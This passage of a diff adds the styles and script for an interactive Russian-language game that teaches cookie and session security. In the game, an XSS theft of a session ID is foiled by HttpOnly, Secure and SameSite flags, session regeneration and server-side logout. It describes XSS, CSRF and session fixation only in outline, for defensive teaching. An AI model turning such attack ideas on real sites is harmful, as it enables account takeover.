+.ix-cookie-sessii .ck-btn:hover{transform:translate(-1px,-1px);box-shadow:5px 5px 0 var(--org)}
+.ix-cookie-sessii .ck-btn:active{transform:translate(3px,3px);box-shadow:1px 1px 0 var(--org)}
+.ix-cookie-sessii .ck-btn.ck-y{background:var(--yel);color:var(--ink)}
+.ix-cookie-sessii .ck-btn:disabled{opacity:.45;cursor:default;transform:none;box-shadow:2px 2px 0 var(--org)}
+
+/* cards */
+.ix-cookie-sessii .ck-split{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:4px}
+.ix-cookie-sessii .ck-card{border:3px solid var(--ink);background:#fff;box-shadow:4px 4px 0 var(--ink);padding:14px 16px 16px}
+.ix-cookie-sessii .ck-ctt{font-family:var(--f-cap);font-size:15px;color:var(--ink);background:var(--yel);display:inline-block;padding:3px 10px;border:2px solid var(--ink);margin-bottom:10px}
+.ix-cookie-sessii .ck-server .ck-ctt,.ix-cookie-sessii .ck-card:nth-child(2) .ck-ctt{background:var(--ink);color:var(--yel)}
+.ix-cookie-sessii .ck-cbody{font-size:17px;line-height:1.45}
+.ix-cookie-sessii .ck-cbody b{font-weight:700}
+.ix-cookie-sessii .ck-def{margin-top:22px;font-size:18px;line-height:1.5}
+.ix-cookie-sessii .ck-def b{font-weight:700}
+.ix-cookie-sessii .ck-note{margin-top:18px;font-size:17px;line-height:1.45;border-left:5px solid var(--yel);padding:2px 0 2px 14px}
+.ix-cookie-sessii .ck-big{font-family:var(--f-mono);font-size:26px;line-height:1.2;margin-top:4px}
+.ix-cookie-sessii .ck-big span{color:#c81e1e}
+
+/* code */
+.ix-cookie-sessii .ck-code{margin:18px 0 0;padding:16px;background:var(--ink);color:#f3efe4;border:3px solid var(--ink);box-shadow:5px 5px 0 var(--red);font-family:var(--code);font-size:14px;line-height:1.6;white-space:pre-wrap;overflow-wrap:anywhere}
+.ix-cookie-sessii .ck-code.ck-code-ok{box-shadow:5px 5px 0 var(--green)}
+.ix-cookie-sessii .ck-badl{display:inline-block;background:rgba(255,59,59,.3);box-shadow:inset 3px 0 0 var(--red);padding:2px 4px}
+.ix-cookie-sessii .ck-badl b{color:#ffd0a0}
+.ix-cookie-sessii .ck-goodl{display:inline-block;background:rgba(46,229,157,.22);box-shadow:inset 3px 0 0 var(--green);padding:2px 4px}
+
+/* questions / choices */
+.ix-cookie-sessii .ck-q{margin:26px 0 12px;font-family:var(--f-cap);font-size:21px;line-height:1.25}
+.ix-cookie-sessii .ck-q b{color:#c81e1e}
+.ix-cookie-sessii .ck-choices{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.ix-cookie-sessii .ck-choices.ck-two-ch{grid-template-columns:1fr 1fr}
+.ix-cookie-sessii .ck-ch{min-height:92px;padding:12px 14px;border:3px solid var(--ink);background:#fff;box-shadow:4px 4px 0 var(--ink);cursor:pointer;text-align:left;display:flex;flex-direction:column;gap:4px;transition:transform .1s,box-shadow .1s}
+.ix-cookie-sessii .ck-ch:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--ink)}
+.ix-cookie-sessii .ck-ch:active{transform:translate(3px,3px);box-shadow:1px 1px 0 var(--ink)}
+.ix-cookie-sessii .ck-ch b{font-family:var(--f-cap);font-weight:400;font-size:19px}
+.ix-cookie-sessii .ck-ch span{font-size:16px;line-height:1.35;color:#3b372e}
+.ix-cookie-sessii .ck-ch.ck-wrong{background:#ffe1e1;border-color:#c81e1e;opacity:.7;cursor:default}
+.ix-cookie-sessii .ck-ch.ck-right{background:var(--green)}
+.ix-cookie-sessii .ck-ch.ck-right span{color:var(--ink)}
+.ix-cookie-sessii .ck-ch:disabled{cursor:default;transform:none}
+.ix-cookie-sessii .ck-fb{margin-top:14px;font-size:18px;line-height:1.4}
+.ix-cookie-sessii .ck-fb:empty{display:none}
+.ix-cookie-sessii .ck-fb b{font-family:var(--f-cap);font-weight:400;margin-right:6px}
+.ix-cookie-sessii .ck-fb.ck-bad b{color:#c81e1e}
+.ix-cookie-sessii .ck-fb.ck-good b{color:var(--gdk)}
+
+/* Set-Cookie + flags */
+.ix-cookie-sessii .ck-setcookie{margin:20px 0 16px;padding:14px 16px;background:var(--ink);color:#f3efe4;border:3px solid var(--ink);box-shadow:4px 4px 0 var(--org);font-family:var(--code);font-weight:700;font-size:15px;line-height:1.5;overflow-wrap:anywhere}
+.ix-cookie-sessii .ck-setcookie .ck-flagchip{color:var(--yel)}
+.ix-cookie-sessii .ck-flags{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.ix-cookie-sessii .ck-flag{position:relative;min-height:150px;padding:14px 14px 42px;border:3px solid var(--ink);background:#fff;box-shadow:4px 4px 0 var(--ink);cursor:pointer;text-align:left;display:flex;flex-direction:column;gap:6px;transition:transform .1s,box-shadow .1s}
+.ix-cookie-sessii .ck-flag:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--ink)}
+.ix-cookie-sessii .ck-flag:active{transform:translate(2px,2px);box-shadow:2px 2px 0 var(--ink)}
+.ix-cookie-sessii .ck-fname{font-family:var(--code);font-weight:800;font-size:18px}
+.ix-cookie-sessii .ck-fdesc{font-size:15.5px;line-height:1.35;color:#3b372e}
+.ix-cookie-sessii .ck-fstop{position:absolute;left:0;right:0;bottom:0;font-family:var(--f-cap);font-size:12px;line-height:1.2;color:#fff;background:var(--gdk);padding:6px 12px;opacity:0;transform:translateY(100%);transition:transform .2s,opacity .2s}
+.ix-cookie-sessii .ck-flag.ck-fon{background:#e9fbf2;border-color:var(--gdk)}
+.ix-cookie-sessii .ck-flag.ck-fon .ck-fstop{opacity:1;transform:none}
+.ix-cookie-sessii .ck-flag.ck-fon::after{content:"✓ ВКЛ";position:absolute;top:10px;right:10px;font-family:var(--f-cap);font-size:12px;background:var(--gdk);color:#fff;padding:2px 7px}
+
+/* BATTLE */
+.ix-cookie-sessii .ck-battle{margin-top:72px;background:var(--ink);color:#fff;border:3px solid var(--ink);box-shadow:8px 8px 0 var(--org);scroll-margin-top:16px;outline:none}
+.ix-cookie-sessii .ck-bh{display:flex;align-items:center;gap:16px;padding:18px 20px;border-bottom:3px solid #333}
+.ix-cookie-sessii .ck-bface{flex:0 0 auto;width:84px;height:84px;border-radius:50%;background:radial-gradient(circle at 38% 34%,#e8a24e,#b96c1e 70%,#8a4e13);border:3px solid var(--org);display:grid;place-items:center;position:relative}
+.ix-cookie-sessii .ck-bface::before,.ix-cookie-sessii .ck-bface::after{content:"";position:absolute;width:11px;height:11px;border-radius:50%;background:#3a2109}
+.ix-cookie-sessii .ck-bface::before{top:20%;left:26%}
+.ix-cookie-sessii .ck-bface::after{top:58%;left:60%}
+.ix-cookie-sessii .ck-bface b{font-family:var(--code);font-weight:800;font-size:17px;color:#fff;background:rgba(20,20,20,.72);padding:2px 7px;border-radius:5px;position:relative;z-index:1}
+.ix-cookie-sessii .ck-bface.ck-ow{animation:ck-shake .4s}
+.ix-cookie-sessii .ck-bhx{flex:1;min-width:0;display:grid;gap:10px}
+.ix-cookie-sessii .ck-bt{margin:0;font-family:var(--f-mono);font-weight:400;font-size:26px;line-height:1.1;color:var(--yel)}
+.ix-cookie-sessii .ck-hp{position:relative;height:30px;border:3px solid #fff;background:#2a2a2a;overflow:hidden}
+.ix-cookie-sessii .ck-hp i{position:absolute;inset:0 auto 0 0;width:100%;background:var(--red);transition:width .6s cubic-bezier(.3,1.5,.5,1);background-image:repeating-linear-gradient(-45deg,rgba(0,0,0,.2) 0 6px,transparent 6px 12px)}
+.ix-cookie-sessii .ck-hp b{position:absolute;inset:0;display:grid;place-items:center;font-family:var(--f-cap);font-weight:400;font-size:14px;text-shadow:0 0 3px #000,0 0 2px #000}
+.ix-cookie-sessii .ck-bbody{position:relative;padding:22px 20px 26px}
+.ix-cookie-sessii .ck-mvn{font-family:var(--f-cap);font-size:14px;color:var(--org);margin-bottom:10px}
+.ix-cookie-sessii .ck-vsay{font-family:var(--f-hand);font-size:25px;line-height:1.2;background:#fff;color:var(--ink);border:3px solid var(--ink);border-radius:16px;padding:10px 16px;box-shadow:4px 4px 0 var(--org);margin-bottom:22px}
+.ix-cookie-sessii .ck-bq{font-family:var(--f-cap);font-size:19px;margin-bottom:12px}
+.ix-cookie-sessii .ck-bopts{display:grid;gap:10px}
+.ix-cookie-sessii .ck-bo{min-height:60px;padding:12px 16px;border:3px solid #fff;background:transparent;color:#fff;cursor:pointer;text-align:left;font-size:18px;line-height:1.3;transition:background .15s}
+.ix-cookie-sessii .ck-bo:hover{background:#262626}
+.ix-cookie-sessii .ck-bo.ck-wrong{border-color:#ff8a8a;color:#ffb3b3;text-decoration:line-through;cursor:default}
+.ix-cookie-sessii .ck-bo.ck-right{background:var(--green);border-color:var(--green);color:var(--ink)}
+.ix-cookie-sessii .ck-bo:disabled{cursor:default}
+.ix-cookie-sessii .ck-bfb{margin-top:16px;font-size:18px;line-height:1.4}
+.ix-cookie-sessii .ck-bfb b{font-family:var(--f-mono);font-weight:400;font-size:24px;display:block;margin-bottom:2px}
+.ix-cookie-sessii .ck-bfb.ck-good b{color:var(--green)}
+.ix-cookie-sessii .ck-bfb.ck-bad b{color:#ff8a8a}
+.ix-cookie-sessii .ck-boom{position:absolute;z-index:5;right:14px;bottom:70px;padding:20px 24px;font-family:var(--f-mono);font-size:26px;line-height:1;color:var(--ink);background:var(--yel);pointer-events:none;
+  clip-path:polygon(50% 0,61% 22%,85% 6%,78% 33%,100% 38%,80% 55%,96% 78%,70% 72%,62% 100%,48% 78%,30% 98%,28% 72%,2% 82%,18% 56%,0 36%,24% 30%,14% 6%,38% 20%);animation:ck-boom .9s cubic-bezier(.2,1.6,.4,1) forwards}
+.ix-cookie-sessii .ck-win{display:grid;gap:16px;justify-items:start}
+.ix-cookie-sessii .ck-wface{position:relative;width:120px;height:120px;border-radius:50%;background:radial-gradient(circle at 38% 34%,#b98a52,#7a4a18 70%);border:3px solid #fff;display:grid;place-items:center;filter:grayscale(.4)}
+.ix-cookie-sessii .ck-wface span{font-family:var(--f-mono);font-size:16px;color:var(--red);background:rgba(255,255,255,.92);border:4px solid var(--red);padding:4px 10px;transform:rotate(-12deg);white-space:nowrap}
+.ix-cookie-sessii.ck-anim .ck-wface span{animation:ck-stampw .5s cubic-bezier(.2,1.6,.4,1) .2s both}
+.ix-cookie-sessii .ck-wint{font-family:var(--f-mono);font-size:28px;line-height:1.1;color:var(--green)}
+.ix-cookie-sessii .ck-wins{font-size:20px}
+.ix-cookie-sessii .ck-wins b{font-family:var(--f-mono);font-weight:400;color:var(--yel);font-size:24px}
+.ix-cookie-sessii .ck-rule{font-family:var(--f-cap);font-size:20px;line-height:1.3;background:var(--yel);color:var(--ink);padding:14px 16px;border:3px solid #fff}
+.ix-cookie-sessii .ck-battle .ck-btn{box-shadow:4px 4px 0 var(--org)}
+
+/* INTERVIEW */
+.ix-cookie-sessii .ck-iv{margin-top:72px;padding:28px 22px 30px;background:#fff;border:3px solid var(--ink);box-shadow:6px 6px 0 var(--ink)}
+.ix-cookie-sessii .ck-ivk{font-family:var(--f-cap);font-size:14px;letter-spacing:.06em;color:#c81e1e;margin-bottom:10px}
+.ix-cookie-sessii .ck-ivq{margin:0 0 20px;font-family:var(--f-cap);font-weight:400;font-size:26px;line-height:1.25}
+.ix-cookie-sessii .ck-think{display:grid;gap:4px;margin-bottom:20px;padding:14px 16px;background:var(--paper);border-left:6px solid var(--yel)}
+.ix-cookie-sessii .ck-think b{font-family:var(--f-cap);font-weight:400;font-size:18px}
+.ix-cookie-sessii .ck-think span{font-size:18px;line-height:1.45}
+.ix-cookie-sessii .ck-iva{margin-top:24px;animation:ck-up .4s ease-out}
+.ix-cookie-sessii .ck-iva ol{margin:0;padding:0;list-style:none;display:grid;gap:18px;counter-reset:ckiv}
+.ix-cookie-sessii .ck-iva li{position:relative;padding-left:46px;font-size:19px;line-height:1.5;counter-increment:ckiv}
+.ix-cookie-sessii .ck-iva li::before{content:counter(ckiv);position:absolute;left:0;top:0;width:32px;height:32px;display:grid;place-items:center;background:var(--ink);color:var(--yel);font-family:var(--f-cap);font-size:17px}
+.ix-cookie-sessii .ck-iva li b{font-weight:700}
+.ix-cookie-sessii .ck-ivx{margin-top:22px;padding:14px 16px;background:var(--ink);color:#fff;font-size:19px;line-height:1.45}
+.ix-cookie-sessii .ck-ivx b{color:var(--yel)}
+
+/* CHEAT SHEET */
+.ix-cookie-sessii .ck-cs{margin-top:72px}
+.ix-cookie-sessii .ck-cst{margin:0 0 10px;font-family:var(--f-cap);font-weight:400;font-size:30px;line-height:1.15}
+.ix-cookie-sessii .ck-csl{list-style:none;margin:0;padding:0}
+.ix-cookie-sessii .ck-csl li{display:flex;gap:18px;align-items:flex-start;padding:20px 0;border-bottom:2px solid rgba(20,20,20,.15)}
+.ix-cookie-sessii .ck-csl li:last-child{border-bottom:0}
+.ix-cookie-sessii .ck-csn{flex:0 0 64px;font-family:var(--f-mono);font-size:36px;line-height:1;color:var(--yel);-webkit-text-stroke:2px var(--ink);paint-order:stroke fill}
+.ix-cookie-sessii .ck-csl b{display:block;font-family:var(--f-cap);font-weight:400;font-size:21px;line-height:1.2;margin-bottom:4px}
+.ix-cookie-sessii .ck-csl p{font-size:18px;line-height:1.45}
+.ix-cookie-sessii .ck-train{margin-top:18px;padding-top:18px;border-top:3px solid var(--ink);font-size:18px;line-height:1.5}
+
+@keyframes ck-drop{from{transform:translateY(-100%)}to{transform:none}}
+@keyframes ck-shake{0%,100%{transform:none}20%{transform:translate(-6px,2px)}40%{transform:translate(5px,-3px)}60%{transform:translate(-4px,1px)}80%{transform:translate(3px,0)}}
+@keyframes ck-pulse{0%,100%{box-shadow:5px 5px 0 var(--org)}50%{box-shadow:5px 5px 0 var(--org),0 0 0 8px rgba(255,214,10,.35)}}
+@keyframes ck-up{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+@keyframes ck-pop{from{opacity:0;transform:scale(.3)}to{opacity:1;transform:none}}
+@keyframes ck-march{to{transform:translateX(-33.3%)}}
+@keyframes ck-fly{0%{opacity:1;left:0}100%{opacity:1;left:100%}}
+@keyframes ck-flyback{0%{opacity:1;left:100%}100%{opacity:1;left:0}}
+@keyframes ck-stampw{from{opacity:0;transform:rotate(-12deg) scale(3)}to{opacity:1;transform:rotate(-12deg) scale(1)}}
+@keyframes ck-boom{0%{opacity:0;transform:scale(.2) rotate(-20deg)}25%{opacity:1;transform:scale(1.15) rotate(4deg)}70%{opacity:1;transform:scale(1) rotate(-2deg)}100%{opacity:0;transform:translateY(-14px) rotate(-2deg)}}
+
+@media (max-width:760px){
+  .ix-cookie-sessii .ck-mission{grid-template-columns:1fr;box-shadow:5px 5px 0 var(--org)}
+  .ix-cookie-sessii .ck-poster{border-right:0;border-bottom:3px solid var(--org);min-height:340px;padding:52px 18px 88px}
+  .ix-cookie-sessii .ck-mbody{padding:22px 16px 24px;gap:16px}
+  .ix-cookie-sessii .ck-mt{font-size:40px}
+  .ix-cookie-sessii .ck-go{align-self:stretch}
+  .ix-cookie-sessii .ck-flags{grid-template-columns:1fr}
+  .ix-cookie-sessii .ck-flag{min-height:0;padding:14px 14px 40px}
+  .ix-cookie-sessii .ck-choices{grid-template-columns:1fr}
+}
+@media (max-width:520px){
+  .ix-cookie-sessii .ck-lvl{margin-top:40px;box-shadow:4px 4px 0 var(--ink)}
+  .ix-cookie-sessii .ck-lh{padding:12px 14px}
+  .ix-cookie-sessii .ck-lt{font-size:20px}
+  .ix-cookie-sessii .ck-lb{padding:18px 14px 20px}
+  .ix-cookie-sessii .ck-bub{font-size:21px}
+  .ix-cookie-sessii .ck-flow{grid-template-columns:1fr;gap:10px}
+  .ix-cookie-sessii .ck-wire{height:24px;width:6px;justify-self:center;background:repeating-linear-gradient(180deg,var(--ink) 0 8px,transparent 8px 14px)}
+  .ix-cookie-sessii .ck-node{padding:12px 12px 14px;min-height:0}
+  .ix-cookie-sessii .ck-nlab{font-size:11px}
+  .ix-cookie-sessii .ck-split{grid-template-columns:1fr}
+  .ix-cookie-sessii .ck-big{font-size:22px}
+  .ix-cookie-sessii .ck-q{font-size:20px}
+  .ix-cookie-sessii .ck-code{font-size:13px;padding:12px}
+  .ix-cookie-sessii .ck-cst{font-size:25px}
+  .ix-cookie-sessii .ck-csl li{gap:14px}
+  .ix-cookie-sessii .ck-csn{flex-basis:54px;font-size:30px}
+  .ix-cookie-sessii .ck-iv{padding:22px 16px 24px}
+  .ix-cookie-sessii .ck-ivq{font-size:22px}
+  .ix-cookie-sessii .ck-iva li{padding-left:42px;font-size:18px}
+  .ix-cookie-sessii .ck-bh{padding:16px 14px;gap:12px}
+  .ix-cookie-sessii .ck-bface{width:68px;height:68px}
+  .ix-cookie-sessii .ck-bt{font-size:20px}
+  .ix-cookie-sessii .ck-bbody{padding:18px 14px 22px}
+  .ix-cookie-sessii .ck-vsay{font-size:22px}
+  .ix-cookie-sessii .ck-hud{padding:7px 10px;gap:8px}
+  .ix-cookie-sessii .ck-hud-l{font-size:10px}
+  .ix-cookie-sessii .ck-pips span{width:22px;height:22px}
+}
+@media (prefers-reduced-motion:reduce){
+  .ix-cookie-sessii *,.ix-cookie-sessii *::before,.ix-cookie-sessii *::after{animation:none !important;transition:none !important}
+  .ix-cookie-sessii .ck-boom{display:none}
+}
+</style>
+
+<script>
+(function(){
+  var root=document.querySelector('.ix-cookie-sessii'); if(!root) return;
+  var RM=window.matchMedia&&matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if(!RM) root.classList.add('ck-anim');
+  function q(s,el){return (el||root).querySelector(s)}
+  function qa(s,el){return Array.prototype.slice.call((el||root).querySelectorAll(s))}
+  function wait(ms){return new Promise(function(r){setTimeout(r,RM?Math.min(ms,40):ms)})}
+  var live=q('[data-live]');
+  function say(t){live.textContent='';setTimeout(function(){live.textContent=t},40)}
+  function go(el){el.scrollIntoView({behavior:RM?'auto':'smooth',block:'start'})}
+
+  /* HUD */
+  var hud=q('.ck-hud'), fill=q('.ck-bar i'), barT=q('.ck-bar b'), pips=qa('.ck-pips span');
+  var S={def:0,steps:[0,0,0,0]};
+  function paint(){fill.style.width=S.def+'%';barT.textContent=S.def+'%';pips.forEach(function(p,i){p.classList.toggle('ck-done',!!S.steps[i])})}
+  function hit(){hud.classList.remove('ck-hit');void hud.offsetWidth;hud.classList.add('ck-hit');setTimeout(function(){hud.classList.remove('ck-hit')},700)}
+  function step(i,def){
+    if(S.steps[i]) return; S.steps[i]=1; S.def=def; paint();
+    var mv=q('[data-mv="'+(i+1)+'"]'); if(mv) mv.classList.add('ck-x');
+    var lv=q('#ix-cookie-sessii-l'+(i+1)); if(lv) lv.classList.add('ck-clear');
+    var nx=q('#ix-cookie-sessii-l'+(i+2)); if(nx) nx.classList.remove('ck-locked');
+  }
+  qa('[data-goto]').forEach(function(b){b.addEventListener('click',function(){
+    var t=q('#'+b.getAttribute('data-goto')); go(t);
+    var f=t.classList.contains('ck-battle')?t:t.querySelector('.ck-lb button');
+    if(f) setTimeout(function(){f.focus({preventScroll:true})},RM?0:500);
+  })});
+
+  /* START */
+  var startBtn=q('[data-act="start"]');
+  startBtn.addEventListener('click',function(){
+    var l1=q('#ix-cookie-sessii-l1');
+    if(!hud.classList.contains('ck-on')){
+      hud.classList.add('ck-on'); paint();
+      l1.classList.remove('ck-locked');
+      startBtn.textContent='Миссия начата ▼';
+      say('Миссия принята. Уровень первый открыт.');
+    }
+    go(l1); setTimeout(function(){q('[data-act="login1"]').focus({preventScroll:true})},RM?0:500);
+  });
+
+  /* L1: login → cookie + session appear */
+  var login1=q('[data-act="login1"]'), jar=q('[data-jar]'), db=q('[data-db]'), pkt=q('[data-pkt]'), net1=q('[data-net1]');
+  login1.addEventListener('click',function(){
+    if(login1.disabled) return; login1.disabled=true;
+    net1.textContent='POST /login — проверяю пароль…';
+    pkt.classList.remove('ck-fly'); void pkt.offsetWidth; pkt.classList.add('ck-fly');
+    wait(720).then(function(){
+      var je=q('[data-jar-empty]'); if(je) je.remove();
+      var de=q('[data-db-empty]'); if(de) de.remove();
+      db.innerHTML='<span class="ck-db-row">7f3a… → Соня, до 18:04</span>';
+      net1.innerHTML='Ответ: <b>Set-Cookie: sid=7f3a…</b> — сервер завёл сессию и прислал номер.';
+      pkt.classList.remove('ck-fly'); pkt.classList.add('ck-flyback');
+      return wait(680);
+    }).then(function(){
+      var c=document.createElement('span'); c.className='ck-cookie ck-pop';
+      c.innerHTML='<i></i><i></i><i></i><i></i><i></i><b>sid=7f3a…</b>'; jar.appendChild(c);
+      pkt.classList.remove('ck-flyback');
+      step(0,25); login1.textContent='Пропуск получен ✓';
+      say('Сервер завёл сессию и выдал cookie с её номером.');
+      var a=q('#ix-cookie-sessii-l1 .ck-after'); go(a);
+      setTimeout(function(){var b=q('#ix-cookie-sessii-l1 [data-goto]'); b&&b.focus({preventScroll:true})},RM?0:560);
+    });
+  });
+
+  /* L2: steal */
+  var stealWrap=q('[data-steal]'), fb2=q('[data-fb2]'), pkt2=q('[data-pkt2]'), theftTxt=q('[data-theft-txt]');
+  qa('.ck-ch',stealWrap).forEach(function(b){b.addEventListener('click',function(){
+    if(b.disabled) return;
+    var v=b.getAttribute('data-v');
+    if(v!=='sid'){
+      b.classList.add('ck-wrong'); b.disabled=true; hit();
+      fb2.className='ck-fb ck-bad';
+      fb2.innerHTML=v==='pass'
+        ? '<b>Нет.</b>Пароль в cookie не лежит — там только номер сессии. Браузер и не знает пароль Сони.'
+        : '<b>Увы.</b>Без флагов браузер отдаёт cookie любому скрипту на странице. Он её прочитает.';
+      return;
+    }
+    qa('.ck-ch',stealWrap).forEach(function(x){x.disabled=true});
+    b.classList.add('ck-right');
+    fb2.className='ck-fb ck-good'; fb2.innerHTML='<b>Да.</b>Скрипт прочитал document.cookie и отправил номер sid на сервер Печенюшника.';
+    step(1,45);
+    var a=q('#ix-cookie-sessii-l2 .ck-after'); setTimeout(function(){go(a)},RM?0:120);
+    pkt2.classList.remove('ck-fly'); void pkt2.offsetWidth; if(!RM) pkt2.classList.add('ck-fly');
+    say('Печенюшник получил номер сессии и кладёт его в свой браузер.');
+  })});
+
+  /* L3: flags */
+  var flagsWrap=q('[data-flags]'), slot=q('[data-flagslot]'), fb3=q('[data-fb3]');
+  var ON={};
+  function renderSlot(){
+    var order=['HttpOnly','Secure','SameSite=Lax'], parts=[];
+    order.forEach(function(f){ if(ON[f]) parts.push(f); });
+    slot.innerHTML=parts.map(function(p){return '; <span class="ck-flagchip">'+p+'</span>'}).join('');
+  }
+  function allOn(){return ON['HttpOnly']&&ON['Secure']&&ON['SameSite=Lax']}
+  qa('.ck-flag',flagsWrap).forEach(function(b){b.addEventListener('click',function(){
+    var f=b.getAttribute('data-flag'); ON[f]=!ON[f];
+    b.classList.toggle('ck-fon',ON[f]); b.setAttribute('aria-pressed',String(!!ON[f]));
+    renderSlot();
+    if(allOn()){
+      fb3.className='ck-fb ck-good'; fb3.innerHTML='<b>Все три стоят.</b>XSS не украдёт номер, в Wi-Fi его не подсмотреть, с чужого сайта cookie не уйдёт.';
+      if(!S.steps[2]){ step(2,70); say('Три флага поставлены. Защита 70 процентов.'); }
+      q('#ix-cookie-sessii-l3').classList.add('ck-clear');
+    } else {
+      var need=['HttpOnly','Secure','SameSite=Lax'].filter(function(x){return !ON[x]});
+      fb3.className='ck-fb ck-bad'; fb3.innerHTML='<b>Ещё не всё.</b>Включи: '+need.join(', ')+'.';
+    }
+  })});
+
+  /* L4: two fixes */
+  var fb4a=q('[data-fb4a]'), after4a=q('[data-after4a]'), fb4b=q('[data-fb4b]');
+  qa('.ck-ch',q('[data-fix1]')).forEach(function(b){b.addEventListener('click',function(){
+    if(b.disabled) return;
+    if(b.getAttribute('data-v')!=='new'){
+      b.classList.add('ck-wrong'); b.disabled=true; hit();
+      fb4a.className='ck-fb ck-bad'; fb4a.innerHTML='<b>Опасно.</b>Если номер не сменить, злодей может заранее подсунуть жертве свой — это фиксация сессии.';
+      return;
+    }
+    qa('.ck-ch',q('[data-fix1]')).forEach(function(x){x.disabled=true});
+    b.classList.add('ck-right');
+    fb4a.className='ck-fb ck-good'; fb4a.innerHTML='<b>Верно.</b>При входе сервер выдаёт новый номер, старый гостевой больше не действует.';
+    after4a.classList.add('ck-show');
+    setTimeout(function(){go(after4a);var f=q('[data-fix2] .ck-ch');f&&f.focus({preventScroll:true})},RM?0:200);
+  })});
+  qa('.ck-ch',q('[data-fix2]')).forEach(function(b){b.addEventListener('click',function(){
+    if(b.disabled) return;
+    if(b.getAttribute('data-v')!=='server'){
+      b.classList.add('ck-wrong'); b.disabled=true; hit();
+      fb4b.className='ck-fb ck-bad'; fb4b.innerHTML='<b>Мало.</b>Cookie стёрли только у Сони. Копия у Печенюшника работает, пока сервер помнит номер.';
+      return;
+    }
+    qa('.ck-ch',q('[data-fix2]')).forEach(function(x){x.disabled=true});
+    b.classList.add('ck-right');
+    fb4b.className='ck-fb ck-good'; fb4b.innerHTML='<b>Точно.</b>Сервер забывает номер 7f3a… — краденая копия сразу мертва.';
+    step(3,100); say('Уровень четвёртый пройден. Защита 100 процентов.');
+    q('#ix-cookie-sessii-l4').classList.add('ck-clear');
+  })});
+
+  /* BATTLE */
+  var MOVES=[
+    {v:'Я вставил чужой скрипт в комментарий и читаю document.cookie. Отдавай номер!',q:'Чем ответишь?',
+     o:[['Поставить cookie флаг HttpOnly',1,'Скрипт больше не видит cookie. Красть нечего.'],
+        ['Прятать номер в самом тексте страницы',0,'Тогда его прочитает тот же скрипт. Не спасает.']]},
+    {v:'Ладно. Сделаю чужой сайт, он тайком отправит форму на ваш банк от имени жертвы.',q:'Что закроет этот путь?',
+     o:[['Secure — только по HTTPS',0,'HTTPS тут ни при чём: запрос всё равно уйдёт с cookie.'],
+        ['SameSite=Lax или Strict',1,'Cookie не прикладывается к запросу с чужого сайта. CSRF сорван.'],
+        ['Сделать номер длиннее',0,'Длина номера не мешает чужому сайту слать запрос.']]},
+    {v:'Тогда украду номер заранее и подсуну его жертве до входа. Потом войду как она.',q:'Как сорвать это?',
+     o:[['При входе выдавать новый номер сессии',1,'Старый подсунутый номер мёртв. Это защита от фиксации сессии.'],
+        ['Просто показать баннер про cookie',0,'Баннер согласия ничего не проверяет и сессию не защищает.']]}
+  ];
+  var bb=q('[data-battle]'), hpI=q('[data-hp]'), hpT=q('[data-hp-t]'), hpW=q('[data-hp-wrap]'), face=q('.ck-bface');
+  var BS;
+  function hp(){var left=3-BS.hits; hpI.style.width=(left/3*100)+'%'; hpT.textContent='ПЕЧЕНЮШНИК · HP '+left+'/3'; hpW.setAttribute('aria-label','Здоровье Печенюшника: '+left+' из 3')}
+  function esc(s){return String(s).replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]})}
+  function bStart(){BS={i:0,hits:0,first:0,missed:false}; hp(); bMove()}
+  function bMove(){
+    var m=MOVES[BS.i]; BS.missed=false;
+    var h='<p class="ck-mvn">ХОД '+(BS.i+1)+' / 3</p><p class="ck-vsay">'+esc(m.v)+'</p><p class="ck-bq">'+esc(m.q)+'</p><div class="ck-bopts">';
+    m.o.forEach(function(o,k){h+='<button type="button" class="ck-bo" data-k="'+k+'">'+esc(o[0])+'</button>'});
+    h+='</div><p class="ck-bfb" data-bfb aria-live="polite"></p>';
+    bb.innerHTML=h;
+    qa('.ck-bo',bb).forEach(function(b){b.addEventListener('click',function(){bPick(b)})});
+  }
+  function bPick(b){
+    if(b.disabled) return;
+    var m=MOVES[BS.i], o=m.o[+b.getAttribute('data-k')], fbx=q('[data-bfb]',bb);
+    if(!o[1]){
+      b.classList.add('ck-wrong'); b.disabled=true; BS.missed=true;
+      fbx.className='ck-bfb ck-bad'; fbx.innerHTML='<b>Промах</b>'+esc(o[2]);
+      return;
+    }
+    qa('.ck-bo',bb).forEach(function(x){x.disabled=true});
+    b.classList.add('ck-right'); BS.hits++; if(!BS.missed) BS.first++; hp();
+    face.classList.remove('ck-ow'); void face.offsetWidth; face.classList.add('ck-ow');
+    if(!RM){var bm=document.createElement('div'); bm.className='ck-boom'; bm.setAttribute('aria-hidden','true'); bm.textContent='УДАР!'; bb.appendChild(bm); setTimeout(function(){bm.remove()},950)}
+    fbx.className='ck-bfb ck-good'; fbx.innerHTML='<b>УДАР!</b>'+esc(o[2]);
+    var nb=document.createElement('div'); nb.className='ck-act';
+    nb.innerHTML='<button type="button" class="ck-btn ck-y">'+(BS.i<2?'Следующий ход ▶':'Добить ▶')+'</button>';
+    fbx.after(nb); var nbtn=q('button',nb);
+    nbtn.addEventListener('click',function(){ BS.i++; if(BS.i<3){bMove(); focusFirst()} else bWin(); });
+    setTimeout(function(){nbtn.focus({preventScroll:true})},30);
+  }
+  function focusFirst(){var f=q('.ck-bo',bb); f&&f.focus({preventScroll:true})}
+  function bWin(){
+    bb.innerHTML='<div class="ck-win"><div class="ck-wface" aria-hidden="true"><span>РАССЫПАЛСЯ</span></div><p class="ck-wint">Печенюшник повержен</p><p class="ck-wins">С первого раза: <b>'+BS.first+'/3</b></p><p class="ck-rule">Cookie — только номер. Защищают его флаги, а сессию — новый ID при входе и смерть при выходе.</p><button type="button" class="ck-btn ck-y" data-again>↺ Ещё раз</button></div>';
+    var a=q('[data-again]',bb); a.addEventListener('click',function(){bStart(); focusFirst()});
+    setTimeout(function(){a.focus({preventScroll:true})},30);
+    say('Печенюшник повержен. С первого раза '+BS.first+' из 3.');
+  }
+  bStart();
+
+  /* INTERVIEW */
+  var ivb=q('[data-act="iv"]'), iva=q('#ix-cookie-sessii-iva');
+  ivb.addEventListener('click',function(){
+    var open=iva.hidden; iva.hidden=!open; ivb.setAttribute('aria-expanded',String(open));
